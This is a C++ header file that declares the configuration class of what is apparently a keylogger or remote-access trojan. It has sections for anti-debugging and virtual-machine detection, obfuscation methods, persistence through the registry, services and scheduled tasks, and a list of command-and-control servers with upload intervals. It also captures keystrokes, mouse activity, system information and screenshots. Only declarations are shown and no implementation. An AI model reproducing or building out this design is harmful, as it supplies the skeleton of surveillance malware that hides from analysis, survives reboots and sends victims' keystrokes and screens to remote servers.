// File: Configuration.h
#pragma once

#include "utils/StringUtils.h"
#include "utils/FileUtils.h"
#include "security/Encryption.h"
#include <string>
#include <unordered_map>
#include <vector>
#include <memory>
#include <mutex>

namespace core {

class Configuration {
public:
    // Configuration sections
    struct SecurityConfig {
        bool enableAntiDebug;
        bool enableVMDetection;
        std::string encryptionKey;
        std::vector<std::string> obfuscationMethods;
    };

    struct PersistenceConfig {
        bool installRegistry;
        bool installService;
        bool installSchedule;
        std::string installationPath;
    };

    struct CommunicationConfig {
        std::string primaryProtocol;
        std::string fallbackProtocol;
        std::vector<std::string> c2Servers;
        int heartbeatInterval;
        int dataUploadInterval;
    };

    struct DataCollectionConfig {
        bool captureKeystrokes;
        bool captureMouse;
        bool captureSystemInfo;
        bool captureScreenshots;
        int screenshotInterval;
    };

    Configuration();
    ~Configuration() = default;

    // Delete copy constructor and assignment operator
    Configuration(const Configuration&) = delete;
    Configuration& operator=(const Configuration&) = delete;

    /**
     * @brief Loads configuration from encrypted file
     * @param filePath Path to configuration file
     * @param decryptionKey Key for decrypting configuration
     * @return true if loading successful, false otherwise
     */
    bool loadFromFile(const std::string& filePath, const std::string& decryptionKey = "");

    /**
     * @brief Saves current configuration to encrypted file
     * @param filePath Destination file path
     * @param encryptionKey Key for encrypting configuration
     * @return true if save successful, false otherwise
     */
    bool saveToFile(const std::string& filePath, const std::string& encryptionKey = "");

    /**
     * @brief Validates current configuration values
     * @return true if configuration is valid, false otherwise
     */
    bool validate() const;

    /**
     * @brief Updates configuration with new values
     * @param newValues Key-value pairs of configuration values
     */
    void update(const std::unordered_map<std::string, std::string>& newValues);

    /**
     * @brief Reloads configuration from disk
     */
    bool reload();

    // Getters for configuration sections
    const SecurityConfig& getSecurityConfig() const { return securityConfig_; }
    const PersistenceConfig& getPersistenceConfig() const { return persistenceConfig_; }
    const CommunicationConfig& getCommunicationConfig() const { return communicationConfig_; }
    const DataCollectionConfig& getDataCollectionConfig() const { return dataCollectionConfig_; }

    // Individual value accessors
    std::string getValue(const std::string& key, const std::string& defaultValue = "") const;
    int getIntValue(const std::string& key, int defaultValue = 0) const;
    bool getBoolValue(const std::string& key, bool defaultValue = false) const;

private:
    /**
     * @brief Parses configuration from decrypted data
     */
    bool parseConfiguration(const std::string& configData);

    /**
     * @brief Applies default values for missing configuration entries
     */
    void applyDefaults();

    /**
     * @brief Generates default encryption key if none provided
     */
    std::string generateDefaultKey() const;

    // Configuration sections
    SecurityConfig securityConfig_;
    PersistenceConfig persistenceConfig_;
    CommunicationConfig communicationConfig_;
    DataCollectionConfig dataCollectionConfig_;

    // Raw configuration storage
    std::unordered_map<std::string, std::string> rawConfig_;
    mutable std::mutex configMutex_;

    // Crypto utilities
    std::unique_ptr<security::Encryption> encryptor_;
    std::string configFilePath_;
    std::string currentDecryptionKey_;
};

} // namespace core